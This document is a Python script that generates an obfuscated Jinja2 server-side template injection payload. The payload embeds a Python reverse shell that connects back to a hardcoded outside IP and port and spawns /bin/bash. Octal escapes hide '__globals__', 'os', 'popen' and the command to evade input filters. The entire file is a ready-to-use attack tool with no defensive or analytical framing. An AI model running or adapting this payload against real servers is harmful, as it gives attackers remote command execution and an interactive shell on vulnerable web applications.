def generate_ssti(ip, port):
    # The raw python reverse shell command
    cmd = f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
    
    # Function to convert string to octal escape sequences
    def to_octal(s):
        return "".join([f"\\{oct(ord(c))[2:].zfill(3)}" for c in s])

    # Encode the components to bypass the filters
    encoded_globals = to_octal("__globals__")
    encoded_get = to_octal("get")
    encoded_os = to_octal("os")
    encoded_popen = to_octal("popen")
    encoded_cmd = to_octal(cmd)

    # Build the final Jinja2 payload
    payload = f'{{{{lipsum|attr("{encoded_globals}")|attr("{encoded_get}")("{encoded_os}")|attr("{encoded_popen}")("{encoded_cmd}")}}}}'
    return payload

# Configuration
TARGET_IP = "3.149.235.214"
TARGET_PORT = 4455

print(f"\n--- SSTI Payload for {TARGET_IP}:{TARGET_PORT} ---")
print(generate_ssti(TARGET_IP, TARGET_PORT))
print("-------------------------------------------\n")
